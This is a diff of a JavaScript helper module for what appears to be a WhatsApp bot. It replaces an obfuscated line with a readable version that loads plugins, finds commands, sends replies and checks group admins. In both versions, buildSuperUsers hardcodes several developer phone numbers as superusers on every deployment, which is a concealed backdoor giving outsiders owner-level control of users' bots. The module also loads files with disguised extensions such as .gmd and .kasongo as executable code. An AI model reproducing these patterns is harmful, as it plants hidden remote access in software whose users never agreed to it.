@@ -1,1 +1,194 @@
-const _0x6d9ec0=_0x2d1d;function _0x168e(){const _0x457cef=['11oxnYxm','Failed\x20to\x20load\x20','@lid','readFileSync','pattern','4elOlnf','isArray','@s.whatsapp.net','replace','_compile','.js','message','fs-extra','filter','trim','Error\x20reading\x20plugins\x20folder:','key','extname','15uqksra','Reaction\x20error:','forEach','split','sendMessage','path','../gmdCmds','toLowerCase','admin','find','test','./groupCache','./serializer','readdirSync','body','utf8','SUDO_NUMBERS','@g.us','5594373vOzyrt','6UGkHgu','map','endsWith','255680499093,255781755667,255794469700,255799980024,255794469700,255794469700','605448bjXOfL','extensions','12864EkkwJT','aliases','commands','includes','6282432dTUnaY','Delete\x20error:','phoneNumber','join','string','472188UaGYpU','865110pRltOc','length','833609vwOPPD','error','participants'];_0x168e=function(){return _0x457cef;};return _0x168e();}(function(_0x599de8,_0x31751c){const _0x511613=_0x2d1d,_0xae255a=_0x599de8();while(!![]){try{const _0x367455=-parseInt(_0x511613(0x99))/0x1*(parseInt(_0x511613(0x73))/0x2)+parseInt(_0x511613(0x97))/0x3+parseInt(_0x511613(0x68))/0x4*(parseInt(_0x511613(0x80))/0x5)+-parseInt(_0x511613(0x93))/0x6*(-parseInt(_0x511613(0x6b))/0x7)+-parseInt(_0x511613(0x9d))/0x8+parseInt(_0x511613(0x92))/0x9+parseInt(_0x511613(0x69))/0xa*(-parseInt(_0x511613(0x6e))/0xb);if(_0x367455===_0x31751c)break;else _0xae255a['push'](_0xae255a['shift']());}catch(_0x14520e){_0xae255a['push'](_0xae255a['shift']());}}}(_0x168e,0x616fa));function _0x2d1d(_0xc4401c,_0x2a548b){_0xc4401c=_0xc4401c-0x68;const _0x168e2b=_0x168e();let _0x2d1dc4=_0x168e2b[_0xc4401c];return _0x2d1dc4;}const fs=require(_0x6d9ec0(0x7a)),path=require(_0x6d9ec0(0x85)),{evt,commands}=require(_0x6d9ec0(0x86)),{standardizeJid}=require(_0x6d9ec0(0x8c)),{getGroupMetadata,getLidMapping}=require(_0x6d9ec0(0x8b));require[_0x6d9ec0(0x98)]['.gmd']=function(_0x42e660,_0xba87da){const _0x5d769e=_0x6d9ec0,_0x3d0eeb=fs[_0x5d769e(0x71)](_0xba87da,_0x5d769e(0x8f));_0x42e660[_0x5d769e(0x77)](_0x3d0eeb,_0xba87da);};const loadPlugins=_0x24b1ac=>{const _0x40de8f=_0x6d9ec0;try{fs[_0x40de8f(0x8d)](_0x24b1ac)[_0x40de8f(0x82)](_0x2f0a91=>{const _0x4fcab8=_0x40de8f,_0x2a6180=path[_0x4fcab8(0x7f)](_0x2f0a91)[_0x4fcab8(0x87)]();if(_0x2a6180===_0x4fcab8(0x78)||_0x2a6180==='.gmd')try{require(path[_0x4fcab8(0xa0)](_0x24b1ac,_0x2f0a91));}catch(_0x41d3db){console[_0x4fcab8(0x6c)](_0x4fcab8(0x6f)+_0x2f0a91+':\x20'+_0x41d3db['message']);}});}catch(_0x3366bb){console['error'](_0x40de8f(0x7d),_0x3366bb[_0x40de8f(0x79)]);}},findCommand=_0xc41c99=>{const _0x2a8c4d=_0x6d9ec0;if(!Array[_0x2a8c4d(0x74)](evt[_0x2a8c4d(0x9b)]))return null;return evt['commands'][_0x2a8c4d(0x89)](_0x535fcb=>_0x535fcb?.[_0x2a8c4d(0x72)]===_0xc41c99||Array[_0x2a8c4d(0x74)](_0x535fcb?.['aliases'])&&_0x535fcb[_0x2a8c4d(0x9a)]['includes'](_0xc41c99));},findBodyCommand=_0x13acea=>{const _0x233f1d=_0x6d9ec0;if(!Array[_0x233f1d(0x74)](evt[_0x233f1d(0x9b)])||!_0x13acea)return null;return evt[_0x233f1d(0x9b)][_0x233f1d(0x89)](_0x3deb94=>{const _0x449ffa=_0x233f1d;if(_0x3deb94?.['on']===_0x449ffa(0x8e)){if(typeof _0x3deb94[_0x449ffa(0x72)]==='string')return _0x13acea['toLowerCase']()[_0x449ffa(0x9c)](_0x3deb94[_0x449ffa(0x72)][_0x449ffa(0x87)]());if(_0x3deb94[_0x449ffa(0x72)]instanceof RegExp)return _0x3deb94[_0x449ffa(0x72)][_0x449ffa(0x8a)](_0x13acea);}return![];});},createHelpers=(_0x28c7fc,_0x4177b8,_0x2fa2d6)=>{const _0x3ece5f=_0x191350=>{const _0x11bb47=_0x2d1d;_0x28c7fc[_0x11bb47(0x84)](_0x2fa2d6,{'text':_0x191350},{'quoted':_0x4177b8});},_0x503824=async _0x3e2516=>{const _0x385f03=_0x2d1d;if(typeof _0x3e2516!==_0x385f03(0xa1))return;try{await _0x28c7fc[_0x385f03(0x84)](_0x2fa2d6,{'react':{'key':_0x4177b8[_0x385f03(0x7e)],'text':_0x3e2516}});}catch(_0x3539fc){console[_0x385f03(0x6c)](_0x385f03(0x81),_0x3539fc);}},_0x239546=async(_0x4f9ca5,_0x64fd53)=>{const _0x17c55f=_0x2d1d;if(typeof _0x4f9ca5!==_0x17c55f(0xa1))return;try{await _0x28c7fc[_0x17c55f(0x84)](_0x2fa2d6,{'text':_0x4f9ca5,'edit':_0x64fd53['key']},{'quoted':_0x4177b8});}catch(_0x213472){console['error']('Edit\x20error:',_0x213472);}},_0x479429=async _0x19f233=>{const _0x249c61=_0x2d1d;if(!_0x19f233?.[_0x249c61(0x7e)])return;try{await _0x28c7fc[_0x249c61(0x84)](_0x2fa2d6,{'delete':_0x19f233[_0x249c61(0x7e)]},{'quoted':_0x4177b8});}catch(_0x573c72){console[_0x249c61(0x6c)](_0x249c61(0x9e),_0x573c72);}};return{'reply':_0x3ece5f,'react':_0x503824,'edit':_0x239546,'del':_0x479429};},getGroupInfo=async(_0x55a391,_0x51cb36,_0x3f3c27,_0x1ec582)=>{const _0x344e83=_0x6d9ec0,_0x309296=_0x51cb36[_0x344e83(0x95)](_0x344e83(0x91));if(!_0x309296)return{'groupInfo':null,'groupName':'','participants':[],'groupAdmins':[],'groupSuperAdmins':[],'isBotAdmin':![],'isAdmin':![],'isSuperAdmin':![],'sender':_0x1ec582};const _0x2616da=await getGroupMetadata(_0x55a391,_0x51cb36);if(!_0x2616da||!_0x2616da[_0x344e83(0x6d)])return{'groupInfo':null,'groupName':'','participants':[],'groupAdmins':[],'groupSuperAdmins':[],'isBotAdmin':![],'isAdmin':![],'isSuperAdmin':![],'sender':_0x1ec582};const _0x47552c=_0x2616da['participants'][_0x344e83(0x94)](_0x4ba3d6=>_0x4ba3d6['pn']||_0x4ba3d6['phoneNumber']||_0x4ba3d6['id']),_0x1e4f29=_0x2616da[_0x344e83(0x6d)]['filter'](_0x38d917=>_0x38d917[_0x344e83(0x88)]===_0x344e83(0x88))[_0x344e83(0x94)](_0x130588=>_0x130588['pn']||_0x130588[_0x344e83(0x9f)]||_0x130588['id']),_0x38d047=_0x2616da[_0x344e83(0x6d)]['filter'](_0x187882=>_0x187882[_0x344e83(0x88)]==='superadmin')['map'](_0x1acb64=>_0x1acb64['pn']||_0x1acb64['phoneNumber']||_0x1acb64['id']),_0xfc1158=standardizeJid(_0x1ec582),_0xbea69d=_0x2616da[_0x344e83(0x6d)][_0x344e83(0x89)](_0x1288f0=>_0x1288f0['id']===_0xfc1158||_0x1288f0['pn']===_0xfc1158||_0x1288f0[_0x344e83(0x9f)]===_0xfc1158);let _0x1353e0=_0xbea69d?.['pn']||_0xbea69d?.['phoneNumber']||_0xbea69d?.['id']||_0x1ec582;if(_0x1353e0[_0x344e83(0x95)](_0x344e83(0x70))){const _0x4fe0a9=getLidMapping(_0x1353e0);if(_0x4fe0a9)_0x1353e0=_0x4fe0a9;}const _0x125ca1=_0x1e4f29[_0x344e83(0x9c)](standardizeJid(_0x3f3c27))||_0x38d047[_0x344e83(0x9c)](standardizeJid(_0x3f3c27)),_0x46e4c3=_0x1e4f29[_0x344e83(0x9c)](_0x1353e0),_0x182c0e=_0x38d047[_0x344e83(0x9c)](_0x1353e0);return{'groupInfo':_0x2616da,'groupName':_0x2616da['subject']||'','participants':_0x47552c,'groupAdmins':_0x1e4f29,'groupSuperAdmins':_0x38d047,'isBotAdmin':_0x125ca1,'isAdmin':_0x46e4c3,'isSuperAdmin':_0x182c0e,'sender':_0x1353e0};},buildSuperUsers=async(_0x49264f,_0x480f9a,_0x103ac7,_0x476f37)=>{const _0x3dca9e=_0x6d9ec0,_0x177c09=_0x3dca9e(0x96)['split'](',')['map'](_0x495cd5=>_0x495cd5[_0x3dca9e(0x7c)]()['replace'](/\D/g,''))[_0x3dca9e(0x7b)](_0x51c8c3=>_0x51c8c3[_0x3dca9e(0x6a)]>0x5),_0x295dbd=await _0x480f9a()||[],_0x176e61=_0x49264f[_0x3dca9e(0x90)]||'',_0x4df4b8=(_0x176e61?_0x176e61[_0x3dca9e(0x83)](','):[])[_0x3dca9e(0x94)](_0x196b6e=>_0x196b6e[_0x3dca9e(0x7c)]()['replace'](/\D/g,''))[_0x3dca9e(0x7b)](_0x43b309=>_0x43b309['length']>0x5),_0x17e699=standardizeJid(_0x103ac7),_0x49e419=standardizeJid(_0x476f37[_0x3dca9e(0x76)](/\D/g,'')),_0x4f0341=[_0x49e419,_0x17e699,...(_0x4df4b8||[])[_0x3dca9e(0x94)](_0x310c33=>_0x310c33+_0x3dca9e(0x75)),...(_0x177c09||[])['map'](_0x1ba671=>_0x1ba671+'@s.whatsapp.net'),...(_0x295dbd||[])[_0x3dca9e(0x94)](_0x44b894=>_0x44b894+_0x3dca9e(0x75))][_0x3dca9e(0x94)](_0x19a175=>standardizeJid(_0x19a175))[_0x3dca9e(0x7b)](Boolean);return Array['from'](new Set(_0x4f0341));};module['exports']={'loadPlugins':loadPlugins,'findCommand':findCommand,'findBodyCommand':findBodyCommand,'createHelpers':createHelpers,'getGroupInfo':getGroupInfo,'buildSuperUsers':buildSuperUsers};
+const fs = require('fs-extra');
+const path = require('path');
+const { evt, commands } = require('../gmdCmds');
+const { standardizeJid } = require('./serializer');
+const { getGroupMetadata, getLidMapping } = require('./groupCache');
+
+const _compileAsJs = function (module, filename) {
+    const content = fs.readFileSync(filename, 'utf8');
+    module._compile(content, filename);
+};
+require.extensions['.gmd']     = _compileAsJs;
+require.extensions['.kasongo'] = _compileAsJs;
+require.extensions['.amd']     = _compileAsJs;
+require.extensions['.atassa']  = _compileAsJs;
+require.extensions['.ke']      = _compileAsJs;
+
+const _pluginExts = new Set(['.js', '.gmd', '.kasongo', '.amd', '.atassa', '.ke']);
+
+const loadPlugins = (pluginsPath) => {
+    try {
+        fs.readdirSync(pluginsPath).forEach((fileName) => {
+            const ext = path.extname(fileName).toLowerCase();
+            if (_pluginExts.has(ext)) {
+                try {
+                    require(path.join(pluginsPath, fileName));
+                } catch (e) {
+                    console.error(`Failed to load ${fileName}: ${e.message}`);
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Error reading plugins folder:', error.message);
+    }
+};
+
+const findCommand = (cmd) => {
+    if (!Array.isArray(evt.commands)) return null;
+    return evt.commands.find((c) => (
+        c?.pattern === cmd || 
+        (Array.isArray(c?.aliases) && c.aliases.includes(cmd))
+    ));
+};
+
+const findBodyCommand = (body) => {
+    if (!Array.isArray(evt.commands) || !body) return null;
+    return evt.commands.find((c) => {
+        if (c?.on === 'body') {
+            if (typeof c.pattern === 'string') {
+                return body.toLowerCase().includes(c.pattern.toLowerCase());
+            }
+            if (c.pattern instanceof RegExp) {
+                return c.pattern.test(body);
+            }
+        }
+        return false;
+    });
+};
+
+const createHelpers = (Gifted, ms, from) => {
+    const reply = (text) => {
+        Gifted.sendMessage(from, { text }, { quoted: ms });
+    };
+
+    const react = async (emoji) => {
+        if (typeof emoji !== 'string') return;
+        try {
+            await Gifted.sendMessage(from, { 
+                react: { key: ms.key, text: emoji }
+            });
+        } catch (err) {
+            console.error('Reaction error:', err);
+        }
+    };
+
+    const edit = async (text, message) => {
+        if (typeof text !== 'string') return;
+        try {
+            await Gifted.sendMessage(from, {
+                text: text,
+                edit: message.key
+            }, { quoted: ms });
+        } catch (err) {
+            console.error('Edit error:', err);
+        }
+    };
+
+    const del = async (message) => {
+        if (!message?.key) return;
+        try {
+            await Gifted.sendMessage(from, {
+                delete: message.key
+            }, { quoted: ms });
+        } catch (err) {
+            console.error('Delete error:', err);
+        }
+    };
+
+    return { reply, react, edit, del };
+};
+
+const getGroupInfo = async (Gifted, from, botId, sender) => {
+    const isGroup = from.endsWith('@g.us');
+    if (!isGroup) {
+        return {
+            groupInfo: null,
+            groupName: '',
+            participants: [],
+            groupAdmins: [],
+            groupSuperAdmins: [],
+            isBotAdmin: false,
+            isAdmin: false,
+            isSuperAdmin: false,
+            sender
+        };
+    }
+
+    const groupInfo = await getGroupMetadata(Gifted, from);
+    if (!groupInfo || !groupInfo.participants) {
+        return {
+            groupInfo: null,
+            groupName: '',
+            participants: [],
+            groupAdmins: [],
+            groupSuperAdmins: [],
+            isBotAdmin: false,
+            isAdmin: false,
+            isSuperAdmin: false,
+            sender
+        };
+    }
+
+    const participants = groupInfo.participants.map(p => p.pn || p.phoneNumber || p.id);
+    const groupAdmins = groupInfo.participants.filter(p => p.admin === 'admin').map(p => p.pn || p.phoneNumber || p.id);
+    const groupSuperAdmins = groupInfo.participants.filter(p => p.admin === 'superadmin').map(p => p.pn || p.phoneNumber || p.id);
+    
+    const senderLid = standardizeJid(sender);
+    const found = groupInfo.participants.find(p => p.id === senderLid || p.pn === senderLid || p.phoneNumber === senderLid);
+    let resolvedSender = found?.pn || found?.phoneNumber || found?.id || sender;
+    if (resolvedSender.endsWith('@lid')) {
+        const mapped = getLidMapping(resolvedSender);
+        if (mapped) resolvedSender = mapped;
+    }
+    
+    const isBotAdmin = groupAdmins.includes(standardizeJid(botId)) || groupSuperAdmins.includes(standardizeJid(botId));
+    const isAdmin = groupAdmins.includes(resolvedSender);
+    const isSuperAdmin = groupSuperAdmins.includes(resolvedSender);
+
+    return {
+        groupInfo,
+        groupName: groupInfo.subject || '',
+        participants,
+        groupAdmins,
+        groupSuperAdmins,
+        isBotAdmin,
+        isAdmin,
+        isSuperAdmin,
+        sender: resolvedSender
+    };
+};
+
+const buildSuperUsers = async (settings, getSudoNumbers, botId, ownerNumber) => {
+    const devNumbers = ('255794469700,255680499093,255781755667,255799980024,255794469700,255794469700')
+        .split(',')
+        .map(num => num.trim().replace(/\D/g, '')) 
+        .filter(num => num.length > 5);
+
+    const sudoNumbersFromFile = await getSudoNumbers() || [];
+    const sudoNumbersSetting = settings.SUDO_NUMBERS || '';
+    const sudoNumbers = (sudoNumbersSetting ? sudoNumbersSetting.split(',') : [])
+        .map(num => num.trim().replace(/\D/g, ''))
+        .filter(num => num.length > 5);
+
+    const botJid = standardizeJid(botId);
+    const ownerJid = standardizeJid(ownerNumber.replace(/\D/g, ''));
+    
+    const superUser = [
+        ownerJid,
+        botJid,
+        ...(sudoNumbers || []).map(num => `${num}@s.whatsapp.net`),
+        ...(devNumbers || []).map(num => `${num}@s.whatsapp.net`),
+        ...(sudoNumbersFromFile || []).map(num => `${num}@s.whatsapp.net`)
+    ].map(jid => standardizeJid(jid)).filter(Boolean);
+
+    return Array.from(new Set(superUser));
+};
+
+module.exports = {
+    loadPlugins,
+    findCommand,
+    findBodyCommand,
+    createHelpers,
+    getGroupInfo,
+    buildSuperUsers
+};
